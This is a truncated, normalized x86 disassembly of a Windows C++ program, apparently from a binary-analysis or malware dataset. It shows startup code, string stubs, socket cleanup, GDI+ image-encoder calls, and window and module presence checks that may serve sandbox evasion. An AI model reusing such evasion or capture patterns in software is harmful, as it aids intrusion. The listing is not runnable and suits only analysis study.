lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_412608
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_40801d
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4010f1
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
setne al
retn
sub_401157
push 0x1
pop eax
retn
sub_4011d2
push 0x0
push r--data
call [ FindWindowA@IAT ]
test eax eax
setne al
retn
sub_4011e5
push 0x0
push r--data
call [ FindWindowA@IAT ]
test eax eax
setne al
retn
sub_401305
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
leave
retn
??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ
mov ecx rw-data
jmp [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_401331
call sub_40133b
jmp sub_401350
sub_40133b
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_401350
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40135c
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40135c
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
j_sub_40136c
jmp sub_40136c
sub_40136c
push 0x40
call ??2@YAPAXI@Z
pop ecx
mov [ rw-data ] eax
retn
sub_40137a
call sub_401384
jmp sub_4013b3
sub_4013b3
push sub_4013bf
call sub_41241a
pop ecx
retn
sub_4013bf
mov ecx rw-data
jmp sub_401ad8
sub_401b51
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_401b98
pop ecx
pop ecx
pop ebp
retn 0x8
sub_401b64
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_412390
pop ecx
pop ebp
retn 0x8
sub_401b74
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401bb0
pop ecx
pop ecx
pop ebp
retn 0x8
sub_401b88
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_401bd8
pop ecx
pop ebp
retn 0x4
sub_401b98
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jge r-xdata
shl eax 0x4
push eax
call ??2@YAPAXI@Z
pop ecx
pop ebp
retn
xor eax eax
sub_401bd0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_401bd8
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x0
call sub_401be7
pop ebp
retn
sub_401c07
call sub_401c11
jmp sub_401c26
sub_401c11
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_401c26
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_401c32
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_401c32
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_401c3d
call sub_401c47
jmp sub_401c54
sub_401c47
push 0x0
mov ecx rw-data
call sub_401fab
retn
sub_401c54
push sub_401c60
call sub_41241a
pop ecx
retn
sub_401c60
mov ecx rw-data
jmp sub_4020a3
sub_401f2d
mov eax r-xdata
retn
sub_401f33
call sub_401f3d
jmp sub_401f4f
sub_401f3d
push r--data
push rw-data
call sub_4110d0
pop ecx
pop ecx
retn
sub_401f4f
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_401f5b
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_401f5b
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_401f66
call sub_401f70
jmp sub_401f85
sub_401f70
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_401f85
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_401f91
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_401f91
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_401f9c
jmp r-xdata
mov ecx rw-data
jmp sub_402aa8
sub_4020a3
push esi
mov esi ecx
push [ esi ]
call closesocket
lea ecx [ esi + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
retn
sub_4020d7
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x0
push [ ecx + 0x14 ]
call sub_4020e9
pop ebp
retn
sub_4021b3
mov al [ ecx + 0x38 ]
retn
sub_4026f6
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_402705
pop ebp
retn 0x4
sub_4027be
call sub_4027c8
jmp sub_4027d5
sub_4027c8
push 0x0
mov ecx rw-data
call sub_401fab
retn
sub_4027d5
push sub_4027e1
call sub_41241a
pop ecx
retn
sub_4027e1
mov ecx rw-data
jmp sub_4020a3
sub_4027eb
call sub_4027f5
jmp sub_40280a
sub_4027f5
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40280a
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_402816
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_402816
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402a90
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_402aab
mov eax esi
pop esi
pop ebp
retn 0x8
sub_402aa8
mov eax ecx
retn
sub_40365f
call sub_403669
jmp sub_40367d
sub_403669
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call sub_403e50
leave
retn
sub_40367d
push sub_403689
call sub_41241a
pop ecx
retn
sub_403689
mov ecx rw-data
jmp sub_403e6b
sub_403e36
mov eax r-xdata
retn
sub_403e4f
retn
sub_403e50
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax ] cl
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
pop ebp
retn 0x4
sub_403f6f
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_403fcf
pop ecx
pop ebp
retn 0x4
sub_403fcf
retn
sub_403fd0
call sub_403fda
jmp sub_403fe4
sub_403fda
mov ecx rw-data
jmp sub_40402c
sub_403fe4
push sub_403ff0
call sub_41241a
pop ecx
retn
sub_403ff0
mov ecx rw-data
jmp sub_403ffa
sub_40419b
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_404206
pop ebp
retn 0x4
sub_4041aa
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_40430b
sub_4041bb
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_404518
pop ebp
retn 0x4
sub_4041ca
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_4048ef
pop ebp
retn 0x4
sub_4041d9
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_404b7b
movzx eax al
pop ebp
retn 0x4
sub_4041eb
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_40425e
pop ebp
retn 0xc
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_404acc
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_405aa2
mov eax [ ecx + 0x40 ]
sub eax 0xa0
je r-xdata
mov [ ecx + 0x2d ] 0x1
dec eax
jne r-xdata
retn
sub_405ab4
mov eax [ ecx + 0x40 ]
sub eax 0xa0
je r-xdata
and [ ecx + 0x2d ] 0x0
dec eax
jne r-xdata
retn
sub_405ac6
mov eax [ ecx + 0x40 ]
sub eax 0xa2
je r-xdata
mov [ ecx + 0x2e ] 0x1
dec eax
jne r-xdata
retn
sub_405ad8
mov eax [ ecx + 0x40 ]
sub eax 0xa2
je r-xdata
and [ ecx + 0x2e ] 0x0
dec eax
jne r-xdata
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_405bef
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_406a3b
call sub_406a45
jmp sub_406a52
sub_406a45
push 0x0
mov ecx rw-data
call sub_401fab
retn
sub_406a52
push sub_406a5e
call sub_41241a
pop ecx
retn
sub_406a5e
mov ecx rw-data
jmp sub_4020a3
sub_406a68
call sub_406a72
jmp sub_406a87
sub_406a72
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_406a87
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_406a93
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_406a93
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_406bfd
call sub_406c07
jmp sub_406c1c
sub_406c07
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
leave
retn
sub_406c1c
push __imp_??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ_406c28
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ_406c28
mov ecx rw-data
jmp [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_406c33
call sub_406c3d
jmp sub_406c52
sub_406c3d
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_406c52
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_406c5e
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_406c5e
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_406c69
call sub_406c73
jmp sub_406c88
sub_406c73
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
leave
retn
sub_406c88
push __imp_??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ_406c94
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ_406c94
mov ecx rw-data
jmp [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_406c9f
call sub_406ca9
jmp sub_406cbe
sub_406ca9
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
leave
retn
sub_406cbe
push __imp_??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ_406cca
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ_406cca
mov ecx rw-data
jmp [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_407f11
call sub_407f1b
jmp sub_407f2f
sub_407f1b
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call sub_403e50
leave
retn
sub_407f2f
push sub_407f3b
call sub_41241a
pop ecx
retn
sub_407f3b
mov ecx rw-data
jmp sub_401ad8
sub_407f45
call sub_407f4f
jmp sub_407f64
sub_407f4f
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_407f64
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_407f70
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_407f70
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_407f7b
call sub_407f85
jmp sub_407f9a
sub_407f85
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_407f9a
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_407fa6
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_407fa6
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_407fb1
call sub_407fbb
jmp sub_407fd0
sub_407fbb
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
leave
retn
sub_407fd0
push __imp_??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ
mov ecx rw-data
jmp [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_407fe7
call sub_407ff1
jmp sub_408006
sub_407ff1
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_408006
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_408012
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_408012
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_409344
mov edx [ ecx + 0x4 ]
test edx edx
jne r-xdata
mov eax [ ecx + 0xc ]
sub eax edx
sar eax 0x4
retn
xor eax eax
retn
sub_4093ac
call sub_4093b6
jmp sub_4093c3
sub_4093b6
push 0x0
mov ecx rw-data
call sub_401fab
retn
sub_4093c3
push sub_4093cf
call sub_41241a
pop ecx
retn
sub_4093cf
mov ecx rw-data
jmp sub_4020a3
sub_409cf5
call sub_409cff
jmp sub_409d0c
sub_409cff
push 0x0
mov ecx rw-data
call sub_401fab
retn
sub_409d0c
push sub_409d18
call sub_41241a
pop ecx
retn
sub_409d18
mov ecx rw-data
jmp sub_4020a3
sub_40a8ab
call sub_40a8b5
jmp sub_40a8ca
sub_40a8b5
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40a8ca
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40a8e1
call sub_40a8eb
jmp sub_40a900
sub_40a8eb
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40a900
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40a90c
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40a90c
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40a917
call sub_40a921
jmp sub_40a936
sub_40a921
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40a936
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40a942
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40a942
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40a94d
call sub_40a957
jmp sub_40a96c
sub_40a957
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40a96c
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40a978
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40a978
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40a983
call sub_40a98d
jmp sub_40a99a
sub_40a98d
push 0x0
mov ecx rw-data
call sub_401fab
retn
sub_40a99a
push sub_40a9a6
call sub_41241a
pop ecx
retn
sub_40a9a6
mov ecx rw-data
jmp sub_4020a3
sub_40b394
call sub_40b39e
jmp sub_40b3ab
sub_40b39e
push 0x0
mov ecx rw-data
call sub_401fab
retn
sub_40b3ab
push sub_40b3b7
call sub_41241a
pop ecx
retn
sub_40b3b7
mov ecx rw-data
jmp sub_4020a3
sub_40b3c1
call sub_40b3cb
jmp sub_40b3e0
sub_40b3cb
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40b3e0
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40b3ec
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40b3ec
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40de6e
push esi
mov esi ecx
push 0x0
call sub_401fab
mov eax esi
pop esi
retn
j_sub_4020a3
jmp sub_4020a3
sub_40dfff
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x8 ]
call sub_411d79
push eax
mov ecx esi
call sub_40e01a
pop esi
pop ebp
retn 0x4
sub_40e217
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40e287
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40e22a
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e2a2
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40e2c3
call sub_40e2cd
jmp sub_40e2da
sub_40e2cd
push 0x0
mov ecx rw-data
call sub_401fab
retn
sub_40e2da
push sub_40e2e6
call sub_41241a
pop ecx
retn
sub_40e2e6
mov ecx rw-data
jmp sub_4020a3
sub_40e772
mov eax r-xdata
retn
sub_40e778
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e5af
add esp 0xc
leave
retn
sub_40e792
call __imp_??0Init@ios_base@std@@QAE@XZ
jmp sub_40e7a7
__imp_??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_40e7a7
push __imp_??1Init@ios_base@std@@QAE@XZ
call sub_41241a
pop ecx
retn
__imp_??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_40e7be
call __imp_??0_Winit@std@@QAE@XZ
jmp sub_40e7d3
__imp_??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_40e7d3
push __imp_??1_Winit@std@@QAE@XZ
call sub_41241a
pop ecx
retn
__imp_??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
sub_40e7ea
call sub_40e7f4
jmp sub_40e801
sub_40e7f4
push 0x0
mov ecx rw-data
call sub_401fab
retn
sub_40e801
push sub_40e80d
call sub_41241a
pop ecx
retn
sub_40e80d
mov ecx rw-data
jmp sub_4020a3
j_sub_40e81c
jmp sub_40e81c
sub_40e81c
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_40e839
call sub_40e843
jmp sub_40e858
sub_40e843
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
leave
retn
sub_40e858
push __imp_??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ_40e864
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ_40e864
mov ecx rw-data
jmp [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_40e86f
call sub_40e879
jmp sub_40e88e
sub_40e879
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40e88e
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40e89a
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40e89a
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40ecad
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call GdipGetImageEncodersSize
pop ebp
retn
sub_40ecbd
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call GdipGetImageEncoders
pop ebp
retn
sub_40ef83
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] 0x1
mov [ eax + 0xc ] ecx
pop ebp
retn 0xc
sub_40eff6
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call GdipFree
pop ebp
retn
sub_40f003
push [ ecx + 0x4 ]
mov [ ecx ] r--data
call GdipDisposeImage
retn
sub_40f051
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call GdipAlloc
pop ebp
retn
sub_40f05e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ecx + 0x8 ] eax
jmp r-xdata
pop ebp
retn 0x4
sub_40f0b8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_40f6c6
push 0x3e8
call [ Sleep@IAT ]
mov eax r-xdata
retn
sub_40f88c
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_411379
neg eax
sbb eax eax
pop ecx
neg eax
retn
sub_40f8a5
call sub_40f8af
jmp sub_40f8bc
sub_40f8af
push 0x0
mov ecx rw-data
call sub_401fab
retn
sub_40f8bc
push sub_40f8c8
